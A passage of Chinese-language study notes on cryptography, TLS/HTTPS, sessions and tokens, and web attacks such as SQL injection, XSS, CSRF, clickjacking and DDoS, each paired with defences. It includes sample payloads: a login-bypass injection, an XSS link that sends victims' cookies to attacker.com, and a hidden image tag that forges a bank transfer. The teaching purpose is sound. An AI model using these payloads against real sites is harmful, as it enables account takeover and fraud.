<li><p>RSA（Rivest-Shamir-Adleman）算法：RSA 是一种广泛应用的非对称加密算法，由 Ron Rivest、Adi Shamir 和 Leonard Adleman 于 1978 年发明。RSA 算法基于大数因子分解问题，它的安全性依赖于大数分解的困难性。RSA 用于加密、解密和数字签名，应用领域包括网页浏览器、电子邮件、VPN 等。</p>
</li>
<li><p>ElGamal 算法：ElGamal 算法由 Taher ElGamal 于 1985 年提出，基于有限域上的离散对数问题。ElGamal 算法主要应用于加密和数字签名，安全性取决于离散对数问题的难度。</p>
</li>
<li><p>ECC（Elliptic Curve Cryptography）：椭圆曲线密码学是一种基于椭圆曲线数学理论的非对称加密算法。ECC 相较于 RSA 和 ElGamal 算法具有更高的安全性和更短的密钥长度，因此在资源受限的环境（如物联网设备、智能卡等）中具有优势。ECC 可应用于加密、解密、数字签名和密钥协商等多个场景。</p>
</li>
<li><p>DSA（Digital Signature Algorithm）：DSA 是一种专门用于数字签名的非对称加密算法，由美国国家安全局（NSA）和美国国家标准与技术研究院（NIST）在 1991 年共同开发。DSA 是基于离散对数问题的，与 ElGamal 算法有相似之处。DSA 的安全性取决于离散对数问题的难度。</p>
</li>
<li><p>Lattice-based cryptography（格基密码学）：格基密码学是一种基于格数学的非对称加密算法，它具有抵抗量子计算机攻击的潜力。NTRU 和 Learning With Errors（LWE）是目前最知名的格基密码学算法。随着量子计算机的发展，格基密码学可能在未来成为一种重要的密码学工具。</p>
</li>
</ol>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名是一种用于验证数据的完整性和来源的真实性的密码学技术。数字签名的基本原理是将数据（如文件、消息或电子文档）通过某种算法处理，生成一个唯一的签名。这个签名可以证明数据的完整性和发送方的身份。数字签名在许多场景中非常有用，如电子邮件、软件分发、电子合同、在线支付等。数字签名的实现通常依赖于非对称加密技术。</p>
<p>以下是数字签名的基本过程：</p>
<ol>
<li><p>数据散列（Hashing）：首先，将要签名的数据通过哈希算法即散列函数（如 SHA-256）处理，生成一个固定长度的散列值。</p>
</li>
<li><p>签名生成：使用发送方的私钥对散列值进行加密，生成数字签名。这一过程确保了只有发送方才能生成有效的签名，因为私钥是唯一的且不能被推导出来。</p>
</li>
<li><p>附加签名：将数字签名附加到原始数据上，然后将数据和签名一起发送给接收方。</p>
</li>
<li><p>签名验证：接收方首先使用相同的散列函数对收到的数据进行散列处理，得到一个散列值。然后，使用发送方的公钥对附加的数字签名进行解密，得到另一个散列值。接收方比较这两个散列值，如果它们完全相同，则说明数据未被篡改，且发送方的身份得到验证。</p>
</li>
</ol>
<p>数字签名的安全性取决于所使用的哈希算法（散列函数）和非对称加密算法的安全性。</p>
<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>数字证书通常由一个受信任的第三方证书颁发机构（CA，Certificate Authority）颁发，CA会对证书持有人进行身份验证，并为其颁发数字证书。数字证书中包含了证书持有人的公钥，而私钥通常由证书持有人自己保存，用于进行数字签名和加密通信。</p>
<p>在数字证书的使用中，客户端和服务器之间的通信过程如下：</p>
<ol>
<li><p>服务器将自己的数字证书发送给客户端。</p>
</li>
<li><p>客户端验证证书的真实性和有效性，如果证书是由一个受信任的CA签发的，并且证书中的信息与服务器身份相符，则客户端会信任该证书。</p>
</li>
<li><p>客户端使用证书中包含的公钥对通信数据进行加密，以确保数据的保密性。</p>
</li>
<li><p>服务器使用自己的私钥对加密数据进行解密，并使用自己的私钥对数字签名进行验证，以确保通信数据的完整性和真实性。</p>
</li>
</ol>
<p>数字证书在互联网安全中发挥了重要的作用，可以用于保护网站的安全，防止中间人攻击、数据篡改等恶意行为。同时，数字证书也可以用于身份认证、数字签名等场景，确保数字数据的安全性和可信性。</p>
<h2 id="SSL-x2F-TLS"><a href="#SSL-x2F-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h2><p>SSL（安全套接层）和TLS（传输层安全）的关系是发展演进关系。TLS是SSL的更新和改进版本。虽然二者经常一起提及，但目前主要使用的是TLS协议，因为它比SSL更安全、更先进。</p>
<p>TLS的工作原理：</p>
<ol>
<li>客户端使用非对称加密与服务器进行通信，实现身份验证并协商对称加密使用的密钥</li>
<li>采用对称加密算法对信息摘要进行加密</li>
</ol>
<p>这样，SSL&#x2F;TLS协议在服务器和客户端之间的通信使用了混合加密方案，既能确保密钥的安全分发，又能保证数据加密的高效性</p>
<h3 id="TLS-握手有哪些步骤？"><a href="#TLS-握手有哪些步骤？" class="headerlink" title="TLS 握手有哪些步骤？"></a>TLS 握手有哪些步骤？</h3><p><img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5aYOr5erfyNBq20X5djTco/3c859532c91f25d961b2884bf521c1eb/tls-ssl-handshake.png" alt="TLS 握手"></p>
<p>TLS 握手是由客户端和服务器交换的一系列数据报或消息。TLS 握手涉及多个步骤，因为客户端和服务器要交换完成握手和进行进一步对话所需的信息。</p>
<p>TLS 握手中的确切步骤将根据所使用的密钥交换算法的种类和双方支持的密码套件而有所不同。大致如下：</p>
<ol>
<li><strong>“客户端问候（client hello）” 消息：</strong> 客户端通过向服务器发送“问候”消息来开始握手。该消息将包含客户端支持的 TLS 版本，支持的密码套件（密码套件是一组用于建立安全通信连接的算法），以及称为一串称为“客户端随机数（client random）”的随机字节。</li>
<li><strong>“服务器问候（server hello）”消息：</strong> 作为对 client hello 消息的回复，服务器发送一条消息，内含服务器的 <a target="_blank" rel="noopener" href="https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/">SSL 证书</a>（SSL证书是一种数字证书，是由数字证书颁发机构（CA）签发的数字证书的一种 ）、服务器选择的密码套件，以及“服务器随机数（server random）”，即由服务器生成的另一串随机字节。</li>
<li><strong>身份验证：</strong> 客户端使用颁发该证书的证书颁发机构验证服务器的 SSL 证书。此举确认服务器是其声称的身份，且客户端正在与该域的实际所有者进行交互。</li>
<li><strong>预主密钥（是在SSL&#x2F;TLS握手期间由客户端生成的随机密钥，用于协商会话密钥）：</strong> 客户端再发送一串随机字节，即“预主密钥（premaster secret）”。预主密钥是使用公钥<a target="_blank" rel="noopener" href="https://www.cloudflare.com/learning/ssl/how-does-public-key-encryption-work/">公钥</a>（客户端从服务器的 SSL 证书中获得公钥）加密的，只能使用服务器的私钥解密。</li>
<li><strong>私钥被使用：</strong>服务器对预主密钥进行解密。</li>
<li><strong>生成会话密钥：</strong>客户端和服务器均使用客户端随机数、服务器随机数和预主密钥生成会话密钥。双方应得到相同的结果。</li>
<li><strong>客户端就绪：</strong>客户端发送一条“已完成”消息，该消息用会话密钥加密。</li>
<li><strong>服务器就绪：</strong>服务器发送一条“已完成”消息，该消息用会话密钥加密。</li>
<li><strong>实现安全对称加密：</strong>已完成握手，并使用会话密钥继续进行通信。</li>
</ol>
<h3 id="TLS-握手期间会发生什么？"><a href="#TLS-握手期间会发生什么？" class="headerlink" title="TLS 握手期间会发生什么？"></a>TLS 握手期间会发生什么？</h3><p>在 TLS 握手过程中，客户端和服务器一同执行以下操作：</p>
<ul>
<li>指定将要使用的 TLS 版本（如TLS 1.0、1.2、1.3 等）</li>
<li>决定将要使用哪些密码套件</li>
<li>通过服务器的公钥和 SSL 证书颁发机构的数字签名来验证服务器的身份</li>
<li>生成会话密钥，以在握手完成后使用对称加密</li>
</ul>
<h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p>HTTPS（超文本传输安全协议）是一种用于保护网络通信安全和数据传输完整性的协议。它在HTTP（超文本传输协议）的基础上添加了SSL&#x2F;TLS加密层，为数据传输提供加密、身份验证和完整性保护。</p>
<h2 id="主要作用"><a href="#主要作用" class="headerlink" title="主要作用"></a>主要作用</h2><ol>
<li>加密通信：HTTPS通过SSL&#x2F;TLS协议加密数据，确保数据在传输过程中不被未经授权的第三方窃取或篡改。</li>
<li>身份验证：HTTPS使用数字证书对服务器进行身份验证，防止用户连接到伪造的服务器，降低中间人攻击的风险。</li>
<li>数据完整性：HTTPS确保数据在传输过程中不会被篡改，从而保证了数据的完整性。</li>
</ol>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ol>
<li>用户在浏览器中输入HTTPS网址并发送请求。</li>
<li>服务器收到请求后返回其数字证书，包括公钥和证书颁发机构（CA）的签名等信息。</li>
<li>浏览器验证服务器证书的有效性，包括证书的颁发者、有效期等。</li>
<li>若验证通过，浏览器使用服务器的公钥加密一个随机生成的会话密钥，并将其发送给服务器。</li>
<li>服务器使用自己的私钥解密会话密钥，然后使用会话密钥对数据进行加密传输。</li>
<li>浏览器使用会话密钥对接收到的加密数据进行解密，展示网页内容。</li>
</ol>
<h1 id="Session、Cookie、Token"><a href="#Session、Cookie、Token" class="headerlink" title="Session、Cookie、Token"></a>Session、Cookie、Token</h1><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>Session 是服务器端用来跟踪和维护用户状态的技术。服务器为每个用户创建一个唯一的 Session ID，并将其与用户的会话数据关联。Session ID 通常通过 Cookie、URL 参数或隐藏表单字段的方式传递给客户端。Session 主要用于识别用户身份、存储用户信息等场景。</p>
<p><code>HttpSession</code> 对象并不是 <code>HttpServletRequest</code> 自带的，但可以通过 <code>HttpServletRequest</code> 对象的 <code>getSession</code> 方法轻松获取。当调用 <code>request.getSession()</code> 时，如果当前请求没有关联的会话，它会自动为您创建一个新的会话。如果只想在已经存在的会话中获取，而不创建新的会话，可以调用 <code>request.getSession(false)</code>。这样，如果没有关联的会话，它将返回 <code>null</code>。</p>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie 是一种存储在客户端（如浏览器）的小型文本文件，用于保存服务器发送给客户端的信息。服务器可以设置、读取和修改 Cookie 以识别和追踪用户。Cookie 可以存储一些简单的数据，如用户 ID、登录状态等。</p>
<p><code>Cookie</code> 对象不是 <code>HttpServletRequest</code> 自带的，但可以通过 <code>HttpServletRequest</code> 对象的 <code>getCookies</code> 方法轻松获取。这个方法会返回一个 <code>Cookie</code> 数组，其中包含客户端发送给服务器的所有 Cookie。若客户端没有发送任何 Cookie，这个方法将返回 <code>null</code>。</p>
<h2 id="Session和Cookie的区别"><a href="#Session和Cookie的区别" class="headerlink" title="Session和Cookie的区别"></a>Session和Cookie的区别</h2><ol>
<li>存储位置不同：Session 存储在服务器端，依赖于 Cookie 或其他方式传递 Session ID；Cookie 存储在客户端；</li>
<li>存储的数据类型不同：Session能够存储任意的JAVA对象，Cookie只能存储String类型的对象。</li>
</ol>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>Token又称“令牌”，Token是服务端生成的一串字符串，用于身份验证，当第一次登录后，服务器生成一个Token并将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据，服务器就可以根据Token信息验证客户端的身份并确定其访问权限。</p>
<h3 id="引入目的"><a href="#引入目的" class="headerlink" title="引入目的"></a>引入目的</h3><p>Token（令牌）的引入是为了解决一些基于传统 Session 和 Cookie 机制的安全性和可扩展性问题。Token 的设计思路是为了在客户端和服务器之间建立一种无状态、可靠的身份验证机制。引入 Token 的原因主要包括以下几点：</p>
<ol>
<li><p>分布式系统和微服务：在分布式系统和微服务架构中，多个不同的服务器可能需要处理同一个客户端的请求。这种情况下，使用基于服务器的会话管理（如 Session + Cookie）可能导致不一致的状态。Token 提供了一种无状态的解决方案，可以在不同的服务器间共享和验证，从而更适合分布式和微服务环境。</p>
</li>
<li><p>安全性：Token 可以提供更好的安全性。相对于传统的 Cookie 机制，Token 可以降低 CSRF（跨站请求伪造）攻击的风险。此外，Token 可以包含签名或加密，以确保数据的完整性和安全性。例如，JWT（JSON Web Token）就是一种常见的 Token 实现方式，它支持签名和加密。</p>
</li>
<li><p>跨域访问：Token 可以更轻松地支持跨域访问。在基于 Token 的身份验证中，客户端可以将 Token 放在请求头（如 <code>Authorization</code> 头）中，从而避免浏览器的 Cookie 跨域限制。</p>
</li>
<li><p>多设备和多平台支持：Token 可以灵活地应用于不同的客户端设备和平台。由于 Token 可以通过请求头、URL 参数或请求体等多种方式传输，它可以轻松地在 Web、移动设备和桌面应用等多种场景下使用。</p>
</li>
<li><p>易于集成：Token 机制通常易于与第三方服务集成，如 OAuth2 和 OpenID Connect 等身份验证协议。这些协议允许用户使用第三方帐户（如 Google、Facebook 或 GitHub）登录应用，而无需创建新的帐户。</p>
</li>
</ol>
<p>总之，Token 引入主要是为了解决传统基于 Session 和 Cookie 的身份验证机制在安全性、可扩展性和跨平台支持方面的挑战。Token 为构建无状态、可扩展且安全的身份验证解决方案提供了一种有效的方法。</p>
<h3 id="Token-可以降低-CSRF（跨站请求伪造）攻击的风险的原理"><a href="#Token-可以降低-CSRF（跨站请求伪造）攻击的风险的原理" class="headerlink" title="Token 可以降低 CSRF（跨站请求伪造）攻击的风险的原理"></a>Token 可以降低 CSRF（跨站请求伪造）攻击的风险的原理</h3><p>要达到在使用Token后降低 CSRF攻击风险的目的，可以将Token放到请求头，（如 <code>Authorization</code> 头）中，攻击者在跨站请求中很难修改请求头，并且浏览器不会像处理 Cookie 那样自动将其发送到服务端，需要在编写客户端代码时，手动获取 Token 并将其添加到请求头中，这就阻止了攻击者将 Token 附加到恶意请求中。这种显式发送 Token 的方式有助于降低 CSRF 攻击的风险。</p>
<p>将 Token 存储在 Cookie 里面并不能降低 CSRF 风险，这样做会使应用面临与传统基于 Cookie 的身份验证相同的 CSRF 攻击风险。</p>
<p>对于存储在客户端代码的某个存储位置（如 LocalStorage、SessionStorage 或内存，非cookie）的 Token，要求开发者在编写客户端代码时，手动获取 Token 并将其添加到请求头中。例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://example.com/api/resource&#x27;</span>, &#123;<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;Bearer &#x27;</span> + token<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure>

<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JWT（JSON Web Token）是一种用于身份验证和授权的开放标准（RFC 7519），它定义了一种紧凑、自包含的 Token 结构。JWT 使用 JSON 对象表示一组声明（Claim），并将其进行 Base64Url 编码和签名或加密，以确保数据的完整性和安全性。JWT 由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。</p>
<p>Token 和 JWT 的关系是：JWT 是 Token 的一种实现方式。Token 是一种更通用的概念，可以有多种实现方式和数据格式。JWT 是一种具体的 Token 实现，它使用 JSON 对象表示 Token 的内容，并通过 Base64Url 编码和签名或加密来确保数据的完整性和安全性。由于 JWT 的紧凑和自包含特性，它在许多场景下被广泛使用，如身份验证、授权和单点登录（SSO）等。</p>
<ul>
<li><p>JSON Web Token（JWT）是一种轻量级的身份验证和授权机制，它使用JSON格式对信息进行编码，以实现安全传输和存储。JWT通常用于Web应用程序中，用于在客户端和服务器之间传递安全的身份认证信息和其他数据。</p>
</li>
<li><p>JWT由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。头部包含有关令牌类型和加密算法的信息；载荷包含有关用户和其他授权信息的信息；签名用于验证令牌的真实性和完整性。</p>
</li>
<li><p>在使用JWT进行身份验证时，服务器通常会在成功验证用户凭据后生成JWT，然后将其发送给客户端。客户端可以在每次请求时将JWT发送回服务器进行身份验证。服务器会验证JWT的签名，并解码载荷中的信息，以确认用户的身份和其他授权信息。</p>
</li>
<li><p>JWT具有以下优点：</p>
<ul>
<li><p>轻量级：JWT使用JSON格式进行编码，可以在客户端和服务器之间轻松传输和存储，而不需要使用复杂的数据格式和协议。</p>
</li>
<li><p>自包含性：JWT包含了所有必要的信息，例如用户身份和其他授权信息，使得在客户端和服务器之间进行身份验证和授权变得非常简单。</p>
</li>
<li><p>可扩展性：JWT的载荷可以包含任意的信息，例如用户ID、角色、权限等信息，以满足不同的应用需求。</p>
</li>
<li><p>安全性：JWT使用签名对令牌进行验证和保护，防止令牌被篡改和伪造。</p>
</li>
</ul>
</li>
<li><p>总之，JWT是一种简单而安全的身份验证和授权机制，可以用于Web应用程序中，以确保用户身份的安全性和可信性。</p>
</li>
</ul>
<h1 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL注入（SQL Injection）是一种常见的网络安全漏洞，攻击者通过在用户输入中注入恶意的 SQL 代码，从而操纵后端数据库，获取未授权的数据访问、修改数据、执行管理操作甚至执行任意代码。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。</p>
<p>以下是一个简单的 SQL 注入攻击示例。假设我们有一个基于用户输入的用户名和密码来验证用户身份的 Web 应用。在不考虑 SQL 注入的情况下，登录查询可能如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">AND</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$password&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>在这里，<code>$username</code> 和 <code>$password</code> 是从用户输入中获取的。攻击者可以在用户名或密码字段中输入恶意 SQL 代码，例如在用户名字段中输入：<code>admin&#39; --</code>。这会导致生成以下查询：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-comment">--&#x27; AND password = &#x27;&#x27;;</span><br></code></pre></td></tr></table></figure>

<p>在这个例子中，<code>--</code> 是 SQL 中的注释符号，从而使得密码验证部分被注释掉，攻击者可以绕过密码验证，成功登录管理员账户。</p>
<p>为了防止 SQL 注入攻击，可以采取以下措施：</p>
<ol>
<li>参数化查询：使用参数化查询（也称为预编译语句或绑定变量）来与数据库交互，而不是直接在 SQL 语句中拼接用户输入。在SQL语句中，变量用?表示，攻击者就无法改变SQL的结构。参数化查询会将用户输入作为参数传递给查询，而不是作为查询的一部分，从而避免 SQL 注入。</li>
<li>输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。例如，可以限制用户名和密码只包含字母和数字。</li>
<li>使用存储过程：将 SQL 代码封装在数据库中的存储过程中，并通过参数调用这些过程。这样可以确保 SQL 代码不受用户输入的影响。</li>
<li>最小权限原则：限制应用程序连接数据库的权限，使其只能访问必要的数据和执行必要的操作，避免使用root等高级权限账户直接连接数据库。这样即使攻击者发起了 SQL 注入攻击，对数据库的潜在破坏也会受到限制。</li>
<li>数据库错误处理：不要向用户显示详细的数据库错误信息，因为这可能为攻击者提供有关数据库结构和配置的敏感信息。应该将详细的错误信息记录在日志中，并向用户显示简洁的错误消息。</li>
</ol>
<h2 id="跨站脚本攻击（XSS攻击）"><a href="#跨站脚本攻击（XSS攻击）" class="headerlink" title="跨站脚本攻击（XSS攻击）"></a>跨站脚本攻击（XSS攻击）</h2><p>跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的网络安全漏洞，攻击者通过在 Web 应用中注入恶意的脚本（通常为 JavaScript），以受害者身份在其浏览器上执行这些脚本。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。</p>
<p>XSS 攻击主要分为三类：</p>
<ol>
<li><p>反射型 XSS：恶意脚本通过 URL 参数传递，当用户点击含有恶意链接的网站或邮件时，攻击者的脚本随请求发送到服务器。攻击者可以构造一个恶意链接，将包含恶意脚本的关键词作为 URL 参数传递：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//example.com/search?search=&lt;script&gt;document.location=&#x27;https://attacker.com/steal?cookie=&#x27;+encodeURIComponent(document.cookie);&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>

<p>当受害者点击这个恶意链接时，恶意脚本会作为参数发送到服务器，然后服务器将脚本嵌入到响应页面中。最后，当受害者浏览器加载页面时，恶意脚本被执行。在这个例子中，恶意脚本将受害者的 Cookie 信息发送到攻击者控制的网站。</p>
</li>
<li><p>存储型 XSS：恶意脚本被存储在服务器上，当受害者访问包含恶意脚本的页面时，脚本被加载并执行。比如，黑客写下一篇含有恶意代码的博客文章，所有访问该博客文章的用户都会在他们的浏览器中执行这段恶意的代码，就会把恶意的脚本保存到服务端。</p>
</li>
<li><p>DOM 型 XSS：这类攻击不涉及服务器，而是在客户端通过操纵 DOM（文档对象模型）实现。攻击者在 URL 参数或其他输入途径中注入恶意脚本，然后通过客户端 JavaScript 代码将脚本插入到 DOM 中并执行。</p>
</li>
</ol>
<p>XSS 攻击可能导致以下危害：</p>
<ul>
<li>窃取用户敏感信息（如 Cookie、会话令牌等）</li>
<li>模拟用户行为</li>
<li>利用受害者的身份执行恶意操作</li>
<li>向受害者展示虚假信息</li>
</ul>
<p>为了防止 XSS 攻击，可以采取以下措施：</p>
<ol>
<li><p>输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。</p>
</li>
<li><p>输出编码：在将用户输入插入到 HTML 页面中之前，对其进行适当的编码，以防止恶意脚本被解释执行。例如，将尖括号 <code>&lt;</code> 和 <code>&gt;</code> 转换为 HTML 实体 <code>&amp;lt;</code> 和 <code>&amp;gt;</code>。</p>
</li>
<li><p>使用内容安全策略（CSP）：CSP 是一种安全特性，可以限制浏览器加载和执行外部资源（如脚本、样式表等）。通过配置 CSP，可以限制脚本来源、禁止内联脚本执行等，从而降低 XSS 攻击的风险。</p>
</li>
<li><p>使用 HttpOnly Cookie：将敏感信息（如会话令牌）存储在 HttpOnly Cookie 中，这样 JavaScript 无法访问这些 Cookie，即使发生 XSS 攻击，攻击者也无法窃取这些敏感信息。</p>
</li>
<li><p>保持软件更新：及时更新 Web 应用程序及其依赖库，以修复可能存在的安全漏</p>
</li>
</ol>
<h2 id="跨站请求伪造攻击（CSRF攻击）"><a href="#跨站请求伪造攻击（CSRF攻击）" class="headerlink" title="跨站请求伪造攻击（CSRF攻击）"></a>跨站请求伪造攻击（CSRF攻击）</h2><p>跨站请求伪造（Cross-Site Request Forgery，简称 CSRF）是一种网络安全漏洞，攻击者利用受害者的登录状态，在受害者不知情的情况下伪造请求，让受害者执行攻击者指定的操作。这种攻击方式通常利用用户在其他网站的登录状态，以及浏览器自动发送 Cookie 的特性。</p>
<p>以下是一个简单的 CSRF 攻击示例。假设我们有一个银行网站，用户在登录后可以进行转账操作。转账请求可能如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://bank.example.com/transfer?to=account&amp;amount=100<br></code></pre></td></tr></table></figure>

<p>在这里，<code>to</code> 参数表示收款人账户，<code>amount</code> 参数表示转账金额。正常情况下，用户登录银行网站后，通过填写表单发起转账请求。</p>
<p>攻击者可以构造一个恶意网站或电子邮件，包含一个自动发起转账请求的图像标签：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://bank.example.com/transfer?to=attacker_account&amp;amount=1000&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure>

<p>当受害者访问恶意网站或查看恶意邮件时，浏览器会自动加载图像，从而发起转账请求。如果受害者同时处于银行网站的登录状态，由于浏览器会自动发送 Cookie，转账请求会被银行网站视为合法操作并执行。</p>
<p>为了防止 CSRF 攻击，可以采取以下措施：</p>
<ol>
<li><p>使用安全令牌：为每个会话或表单生成一个随机的安全令牌，将其嵌入到表单或请求中。服务器需要验证表单中的令牌与请求信息中（如Session或Cookie）的令牌是否匹配，以确保请求来自合法用户。</p>
</li>
<li><p>SameSite Cookie：将 Cookie 的 SameSite 属性设置为 <code>Strict</code> 或 <code>Lax</code>，以防止跨站请求发送 Cookie。这样，即使攻击者发起 CSRF 攻击，请求也不会附带有效的 Cookie，从而阻止攻击。</p>
</li>
<li><p>验证请求来源：检查请求的来源（如 <code>Referer</code> 和 <code>Origin</code> 头），确保请求来自可信的网站。这可以防止跨站请求，但可能受到某些限制（如代理和浏览器设置）。</p>
</li>
<li><p>双重验证：对于敏感操作（如转账、密码修改等），使用双重验证（如短信验证码、邮件确认等）确保用户确实想要执行该操作。</p>
</li>
<li><p>使用自定义请求头：为 AJAX 请求添加自定义请求头，例如 CSRF-Token，因为跨站请求通常无法修改请求头。在服务器端，验证请求头中的 CSRF-Token 是否有效。</p>
</li>
</ol>
<h2 id="点击劫持攻击"><a href="#点击劫持攻击" class="headerlink" title="点击劫持攻击"></a>点击劫持攻击</h2><p>点击劫持攻击是一种网络安全漏洞，攻击者通过在受害者浏览器中重叠不透明或透明的 Web 页面层，诱导受害者在不知情的情况下点击或与被遮盖的原始页面上的元素进行交互。这种攻击通常利用 HTML 和 CSS 技术实现，并可能导致用户泄露敏感信息或执行不安全操作。</p>
<p>为了防止点击劫持攻击，可以采取以下措施：</p>
<ol>
<li><p>frame busting：通常可以写一段JavaScript代码，以禁止iframe的嵌套，这种方法叫frame busting</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (top.<span class="hljs-property">location</span> != location) &#123;<br>	top.<span class="hljs-property">location</span> = self.<span class="hljs-property">location</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>使用 X-Frame-Options 响应头：frame busting存在被绕过的可能，比较好的方案是使用一个HTTP头，X-Frame-Options，服务器可以发送 X-Frame-Options 响应头来指示浏览器不允许将网站嵌入到 iframe 中。这将阻止攻击者使用 iframe 构建点击劫持攻击。例如，设置 <code>X-Frame-Options: DENY</code> 将完全禁止嵌入。</p>
</li>
</ol>
<h2 id="拒绝服务攻击（DDoS-攻击）"><a href="#拒绝服务攻击（DDoS-攻击）" class="headerlink" title="拒绝服务攻击（DDoS 攻击）"></a>拒绝服务攻击（DDoS 攻击）</h2><p>拒绝服务攻击（Denial of Service, 简称 DoS）是一种网络安全攻击，其目的是让目标系统或网络资源无法正常提供服务。分布式拒绝服务攻击（Distributed Denial of Service, 简称 DDoS）是 DoS 攻击的一种，它利用大量分布在不同位置的攻击者（通常是通过僵尸网络）同时向目标发起攻击，从而更有效地干扰目标系统的正常运行。</p>
<p>DDoS 攻击有多种类型，主要分为以下三类：</p>
<ol>
<li><p>网络层攻击：这类攻击主要针对网络基础设施，例如通过 ICMP 洪水攻击，来消耗目标的网络带宽资源，导致正常用户无法访问。</p>
<p>防御措施：</p>
<ul>
<li>增加网络带宽：提升网络带宽可以缓解网络层攻击带来的影响。</li>
<li>配置防火墙规则：限制 ICMP、UDP 流量，减少恶意流量进入网络。</li>
<li>采用流量清洗服务：使用第三方 DDoS 防护服务，如 Cloudflare、AWS Shield、Akamai 等，以帮助检测和过滤攻击流量。</li>
</ul>
</li>
<li><p>传输层攻击：这类攻击主要针对目标系统的传输层协议，例如通过 SYN 洪水攻击（发送大量未完成的 TCP 连接请求）、UDP 洪水攻击来消耗目标系统的连接资源，使其无法处理正常用户的连接请求。</p>
<p>防御措施：</p>
<ul>
<li>配置防火墙规则：限制 SYN 数据包的速率，防止攻击者发送大量未完成的连接请求；限制 UDP 流量，减少恶意流量进入网络。</li>
<li>使用 SYN Cookies：在不需要分配额外资源的情况下，对 SYN 数据包进行验证。</li>
<li>启用连接限制：限制每个 IP 地址可建立的连接数，降低攻击影响。</li>
</ul>
</li>
<li><p>应用层攻击：这类攻击针对目标系统的应用层服务，例如通过 HTTP 洪水攻击（发送大量伪造的 HTTP 请求）来消耗目标系统的计算资源，导致正常用户无法访问。</p>
<p>防御措施：</p>
<ul>
<li>启用 Web 应用防火墙（WAF）：监控和过滤应用层恶意请求。</li>
<li>使用内容分发网络（CDN）：通过分布式服务器缓存和提供网站内容，抵抗应用层攻击。</li>
<li>限制请求速率：对来自单个 IP 地址的请求速率进行限制，防止攻击者发送大量请求。</li>
<li>使用负载均衡：在多个服务器之间分配流量，分散攻击负载。</li>
</ul>
</li>
</ol>
<p>综合防御措施：</p>
<ul>
<li>网络分层和隔离：实施分层和隔离策略，限制攻击者对关键资源的访问。</li>
<li>使用安全配置和补丁：保持系统和软件的安全配置，及时应用安全补丁，以减少潜在的漏洞。</li>
<li>监控和应急计划：持续监控网络流量和系统性能，制定应急计划以应对 DDoS 攻击。</li>
</ul>
<h2 id="防火墙和入侵防御系统"><a href="#防火墙和入侵防御系统" class="headerlink" title="防火墙和入侵防御系统"></a>防火墙和入侵防御系统</h2><p>防火墙主要负责阻止或允许网络流量通过，基于预先定义的规则集来对传入和传出流量进行过滤。防火墙的主要目的是在内部网络和外部网络之间建立安全边界。</p>
